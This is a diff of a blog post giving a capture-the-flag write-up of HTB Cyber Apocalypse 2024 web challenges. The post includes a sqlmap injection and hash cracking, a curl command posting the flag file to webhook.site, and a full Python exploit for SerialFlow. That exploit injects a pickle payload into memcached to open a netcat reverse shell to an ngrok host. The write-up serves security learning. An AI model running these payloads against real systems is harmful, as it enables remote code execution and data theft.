@@ -1,17 +1,15 @@
 ---
 layout: post
-title:  "HTB Cyber Apocalypse 2024: Hacker Royale - Writeup"
+title:  "HTB Cyber Apocalypse 2024: Hacker Royale - Web"
 date:   2024-03-14 00:00:00
-description: "HTB Cyber Apocalypse 2024: Hacker Royale - Writeup"
+description: "HTB Cyber Apocalypse 2024: Hacker Royale - Web"
 tag:
   - Web
-  - Reversing
-  - Cryptography
-  - Forensics
-  - Misc
-  - PWN
-  - Hardware
 ---
+
+<h2>Table of Contents</h2>
+- TOC	- TOC
+{:toc}
 
 ### **Flag Command - Web**
 
@@ -100,11 +98,11 @@ const fetchOptions = () => {
 
 Here is the list of available commands, including the secret:
 
-![Flag Command](/images/post/HTBAPOCALYPSE2024_flagcommand1.png)
+![Flag Command](images/HTBAPOCALYPSE2024_flagcommand1.png)
 
 Getting the flag with the secret command "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack":
 
-![Flag Command](/images/post/HTBAPOCALYPSE2024_flagcommand2.png)
+![Flag Command](images/HTBAPOCALYPSE2024_flagcommand2.png)
 
 **Flag**: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}
 
@@ -115,30 +113,30 @@ Getting the flag with the secret command "Blip-blop, in a pickle with a hiccup! 
 **Solving Scenario:**\
 Trigger the login page error by sending 'a# as the username. The response should display an SQL error indicating vulnerability to SQL Injection.
 
-![KORP Terminal](/images/post/HTBAPOCALYPSE2024_korpterminal1.png)
+![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal1.png)
 
 Exploit using SQLmap with the input file containing the above POST request.
 Command: "sqlmap -r login.txt --dbs --ignore-code 401".
 
 Database:
 
-![KORP Terminal](/images/post/HTBAPOCALYPSE2024_korpterminal2.png)
+![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal2.png)
 
 Tables korp_terminal:
 
-![KORP Terminal](/images/post/HTBAPOCALYPSE2024_korpterminal3.png)
+![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal3.png)
 
 Dump table users:
 
-![KORP Terminal](/images/post/HTBAPOCALYPSE2024_korpterminal4.png)
+![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal4.png)
 
 Cracking admin hash:
 
-![KORP Terminal](/images/post/HTBAPOCALYPSE2024_korpterminal5.png)
+![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal5.png)
 
 Login with credentials admin:password123 and retrieve the flag:
 
-![KORP Terminal](/images/post/HTBAPOCALYPSE2024_korpterminal6.png)
+![KORP Terminal](images/HTBAPOCALYPSE2024_korpterminal6.png)
 
 **Flag**: HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}
 
@@ -184,11 +182,11 @@ class TimeController
 
 Validation of vulnerability:
 
-![TimeKORP](/images/post/HTBAPOCALYPSE2024_timekorp1.png)
+![TimeKORP](images/HTBAPOCALYPSE2024_timekorp1.png)
 
 Read the flag at /flag as per the Dockerfile:
 
-![TimeKORP](/images/post/HTBAPOCALYPSE2024_timekorp2.png)
+![TimeKORP](images/HTBAPOCALYPSE2024_timekorp2.png)
 
 **Flag**: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}
 
@@ -311,7 +309,7 @@ cat /flag* > /tmp/flag.txt && curl -d @/tmp/flag.txt https://webhook.site/e361f2
 
 Run the exploit. If the request does not go through, try running it again:
 
-![Labyrinth Linguist](/images/post/HTBAPOCALYPSE2024_labyrinth1.png)
+![Labyrinth Linguist](images/HTBAPOCALYPSE2024_labyrinth1.png)
 
 **Flag**: HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}
 
@@ -458,7 +456,7 @@ Save the solver file inside the challenge source code folder so that the pb libr
 Run with the command "go run call.go".
 Refresh the web page, and the flag will be obtained.
 
-![Testimonial](/images/post/HTBAPOCALYPSE2024_testimonial1.png)
+![Testimonial](images/HTBAPOCALYPSE2024_testimonial1.png)
 
 **Flag**: HTB{w34kly_t35t3d_t3mplate5}
 
@@ -548,6 +546,103 @@ if __name__ == "__main__":
 
 **================================================================================================**
 
-## ****
+## **SerialFlow - Web**
 
 **Solving Scenario:**\
+In the app.py file, it is known that app.config utilizes session memcached with the pylibmc library:
+``` python
+app.config["SESSION_TYPE"] = "memcached"
+app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
+app.config.from_object(__name__)
+```
+
+When making a request to the web, the first process that runs is setting the session:
+``` python
+@app.before_request
+def before_request():
+    if session.get("session") and len(session["session"]) > 86:
+        session["session"] = session["session"][:86]
+```
+
+There is only one endpoint "/set" on the web which functions to set session["uicolor"].
+``` python
+@app.route("/set")
+def set():
+    uicolor = request.args.get("uicolor")
+
+    if uicolor:
+        session["uicolor"] = uicolor
+    
+    return redirect("/")
+```
+
+Interestingly, because the Flask web app uses pylibmc memcached, after browsing, an article [D4D blog](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/) was found discussing the exploitation of pylibmc memcached and its vulnerable to Command Injection.
+
+Previously, an attempt was made to inject payload into session["uicolor"], but it failed because it was not vulnerable to CRLF.
+
+After re-analyzing the source code, it was discovered that we can inject payloads directly into the session, but they are limited to 86 characters in length.
+
+Let's proceed to exploit it by performing a reverse shell:
+
+Solver:
+``` python
+import pickle
+import os
+import requests
+
+URL = "http://83.136.253.251:31432/"
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('nc 0.tcp.ap.ngrok.io 13906 -e /bin/sh')
+        return os.system, (cmd,)
+
+class Exploit():
+    def __init__(self, url=URL):
+        self.url = url
+
+    def generate_exploit(self):
+        payload = pickle.dumps(RCE(), 0)
+        payload_size = len(payload)
+        cookie = b'137\r\nset session:10 0 2592000 '
+        cookie += str.encode(str(payload_size))
+        cookie += str.encode('\r\n')
+        cookie += payload
+        cookie += str.encode('\r\n')
+        cookie += str.encode('get session:10')
+
+        pack = ''
+        for x in list(cookie):
+            if x > 64:
+                pack += oct(x).replace("0o","\\")
+            elif x < 8:
+                pack += oct(x).replace("0o","\\00")
+            else:
+                pack += oct(x).replace("0o","\\0")
+
+        return f"\"{pack}\""
+
+    def exploit(self):
+        cookie = {"session": self.generate_exploit()}
+        req = requests.get(self.url, cookies=cookie)
+        req = requests.get(self.url, cookies=cookie)
+
+        return req.status_code
+
+if __name__ == "__main__":
+    run = Exploit()
+    print(run.exploit())
+```
+
+![SerialFlow](images/HTBAPOCALYPSE2024_serialflow1.png)
+
+**Flag**: HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}
+
+Thank you for reading this article, i hope it was helpful :-D\
+**Follow me on: [Linkedin], [Medium], [Github], [Youtube], [Instagram]**
+
+[Linkedin]: https://www.linkedin.com/in/muhammad-ichwan-banua/
+[Medium]: https://banua.medium.com
+[Github]: https://github.com/banuaa
+[Youtube]: https://www.youtube.com/@muhammad.iwn-banua
+[Instagram]: https://www.instagram.com/muhammad.iwn
